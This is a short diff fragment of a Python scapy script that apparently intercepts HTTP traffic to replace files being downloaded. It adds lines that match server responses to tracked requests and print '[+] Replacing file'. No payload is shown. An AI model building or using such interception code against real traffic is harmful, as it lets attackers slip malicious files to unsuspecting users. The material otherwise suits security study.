@@ -19,3 +19,6 @@ def process_packet(packet):
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                
